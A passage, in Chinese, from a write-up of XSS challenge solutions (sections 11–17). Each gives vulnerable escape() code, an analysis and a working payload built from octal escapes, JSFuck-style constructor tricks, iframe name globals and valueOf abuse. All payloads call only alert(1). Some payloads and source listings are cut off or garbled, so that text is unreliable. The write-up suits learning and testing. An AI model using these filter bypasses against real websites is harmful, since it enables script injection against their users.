直接将`");alert(1)//`中的`alert(1)`用`jsfuck`表示。
    http://www.jsfuck.com/
但是直接使用工具生成的`jsfuck`太长了，不过我们还有另一种方法，就是`JS`的匿名函数。
我们可以通过这种方法来执行任意方法。
    []['map']['constructor']('alert(1)')()
由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。
    ");[]['\155\141\160']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()//
### 11.3 Payload
    方法一 1232个字符
    ");[][(//
    方法二 100个字符
    ");[]['\155\141\160']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()//
## 12\. iframe
### 12.1 源码
    function escape(s) {
        var tag = document.createElement('iframe');
        // For this one, you get to run any code you want, but in a "sandboxed" iframe.
        // https://4i.am/?...raw=... just outputs whatever you pass in.
        // Alerting from 4i.am won't count.
        s = '' + s + '';
        tag.src = 'https://4i.am/?:XSS=0&CT=text/html&raw=' + encodeURIComponent(s);
        window.WINNING = function() {
            youWon = true;
        };
        tag.setAttribute('onload', 'youWon && alert(1)');
        return tag.outerHTML;
    }
### 12.2 分析
代码逻辑很简单，只要使`youWon`为`true`，这样就能执行`alert(1)`了。  
解决思路是利用到`iframe`的特性，当在`iframe`中设置了一个`name`属性之后，
这个`name`属性的值就会变成`iframe`中的`window`对象的全局。
### 12.3 Payload
    name="youWon"
## 13\. TI(S)M
### 13.1 源码
    function escape(s) {
        function json(s) {
            return JSON.stringify(s).replace(/\//g, '\\/');
        }
        function html(s) {
            return s.replace(/[<>"&]/g,
            function(s) {
                return '&#' + s.charCodeAt(0) + ';';
            });
        }
        return ('\n\n' + '  \n' + '  URL: ' + html(s) + '\n\n' + '\n' + '');
    }
### 13.2 分析
本题用到了一个小`trick`:  
`HTML5`解析器会将``来防止解析器报语法错误。
首先输入一个``，此时的输出中
      URL: &#60;!--&#60;script&#62;
这一段所有的代码都会当做`JS`执行。  
在后面有个正则表达式`!/^http:.*/`，其中的`*/`可以当做注释，那么我们在前面再加入一个`/*`即可闭合。  
此时的输出为
    var url = "\/*
      URL: /*&#60;!--&#60;script&#62;
那么，在注释符之前添加要执行的代码就可以了。
### 13.3 Payload
    if(alert(1)/*
## 14\. JSON 3
### 14.1 源码
    function escape(s) {
        return s.split('#').map(function(v) {
            // Only 20% of slashes are end tags; save 1.2% of total
            // bytes by only escaping those.
            var json = JSON.stringify(v).replace(/`来执行JS代码，不过因为后面没有`-->`，解析器会报错，需要我们在后面构造一个`-->`来避免报错。
构造的`Payload`为`#)/;alert(1)//-->`，此时输出为
    console.log("console.log(")/`被当做了正则表达式解析，后面通过分号分割后，成功执行代码`alert(1)`。
### 14.3 Payload
    #)/;alert(1)//-->
## 15\. Skandia 3
### 15.1 源码
    function escape(s) {
        if (/[\\<>]/.test(s)) return '-';
        return '';
    }
### 15.2 分析
代码过滤了`\`、``、同样使用`jsfuck`就能过。因为对`\`进行了过滤，不能使用八进制编码来绕过了。  
根据`jsfuck`的[原理](https://zh.wikipedia.org/wiki/JSFuck)，我们借助匿名函数来构造一个更短的`Payload`。
    []["sort"]["constructor"]('alert(1)')()
接下来的目标是将其中的字母以其他形式来表示。
  * 用 `!` 开头会转换成 `Boolean 布尔值`
  * 用 `+` 开头会转换成 `Number 数值类型`
  * 添加 `[]` 会转换成 `String 字符串`
  * `![] === false` 、 `+[] === 0` 、 `[]+[] === ""`
值 | 经过jsfuck转换后  
---|---  
false | `![]`  
true | `!![]`或`!+[]`  
NaN | `+[![]]`或`+[][[]]`  
undefined | `[][[]]`  
Infinity | `+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])`  
由此我们需要获得`construale`这些字符的特殊表示。很明显，上述表格内的字母是不够的，需要继续构造。
    (![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2] === "fill"
    []['fill']+[] === [][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[] ==="function fill() { [native code] }"
可得
    "c" === ([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[3]
    "o" === ([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]
    "n" === ([][[]]+[])[1]
    "s" === (![]+[])[3]
    "t" === (!![]+[])[0]
    "r" === (!![]+[])[1]
    "u" === (!![]+[])[2]
    "a" === (![]+[])[1]
    "l" === (![]+[])[2]
    "e" === (![]+[])[4]
可得
    "sort" === (![]+[])[3]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+(!![]+[])[1]+(!![]+[])[0]
    "constructor" === ([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[3]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+(!![]+[])[2]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[3]+(!![]+[])[0]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+(!![]+[])[1]
    "alert" === (![]+[])[1]+(![]+[])[2]+(![]+[])[4]+(!![]+[])[1]+(!![]+[])[0]
将其拼接入`Payload`，长度为`525`。
    ");[][(//
从网上找了一种更为简便的方法。
表达式 | 值  
---|---  
`''+!1` | false  
`''+!0` | true  
`''+{}[0]` | undefined  
`''+{}` | [object Object]  
    "sort" === (''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]
    "constructor" === (''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]
    "alert" === (''+!1)[1]+(''+!1)[2]+(''+!1)[4]+(''+!0)[1]+(''+!0)[0]
构造`Payload`，长度为`241`。
    ");[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]((''+!1)[1]+(''+!1)[2]+(''+!1)[4]+(''+!0)[1]+(''+!0)[0]+'(1)')()//
### 15.3 Payload
    方法一
    ");[][(//
    方法二
    ");[][(//
    方法三
    ");[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]((''+!1)[1]+(''+!1)[2]+(''+!1)[4]+(''+!0)[1]+(''+!0)[0]+'(1)')()//
[](./img/4400318517035210321.pnghttp://
"15")
## 16\. RFC4627
### 16.1 源码
    function escape(text) {
        var i = 0;
        window.the_easy_but_expensive_way_out = function() {
            alert(i++)
        };
        // "A JSON text can be safely passed into JavaScript's eval() function
        // (which compiles and executes a string) if all the characters not
        // enclosed in strings are in the set of characters that form JSON
        // tokens."
        if (! (/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(text.replace(/"(\\.|[^"\\])*"/g, '')))) {
            try {
                var val = eval('(' + text + ')');
                console.log('' + val);
            } catch(_) {
                console.log('Crashed: ' + _);
            }
        } else {
            console.log('Rejected.');
        }
    }
### 16.2 分析
从代码来看，我们如果想要执行`alert(1)`，需要调用两次`the_easy_but_expensive_way_out`方法。  
从正则来看，代码并没有限制我们使用`self`，因此我们可以借助`self`来调用全局方法`the_easy_but_expensive_way_out`。
在这里使用了一个小`trick`
  * 在`JS`中让一个对象和一个值或者一个字符进行相加等运算，`JS`解析器会调用对象的`valueOf`方法来计算对象的值。
因此我们可以传入一个对象，它的`valueOf`指向的是`self['the_easy_but_expensive_way_out']`方法，然后让这个对象与一个数字或者字符做运算，就能调用`self['the_easy_but_expensive_way_out']`了，但是需要`alert(1)`，所以需要我们调用两次。
> 参考链接
>
>  is.html>
### 16.3 Payload
    {"valueOf":self["the_easy_but_expensive_way_out"]}+0,{"valueOf":self["the_easy_but_expensive_way_out"]}
第一次调用是在`eval`中，通过`{"valueOf":self["the_easy_but_expensive_way_out"]}+0`调用，第二次是在`console.log(''
+ val);`中，对象与字符进行了相加操作，从而调用了`self['the_easy_but_expensive_way_out']`方法。
## 17\. Well
### 17.1 源码
    function escape(s) {
        http: //www.avlidienbrunn.se/xsschallenge/
        s = s.replace(/[\r\n\u2028\u2029\\;,()\[\] var email = '" + s + "'; ";
    }
### 17.2 分析
代码过滤了`\r`、`\n`、`\u2028`、`\u2029`、`\`、`;`、`,`、`(`、`)`、`[`、`]`和`<`。  
单引号没被过滤，可以闭合前面的语句，通过定义函数来执行代码。
在`Payload`中，我们借助了`new Function`[语法](https://zh.javascript.info/new-function)。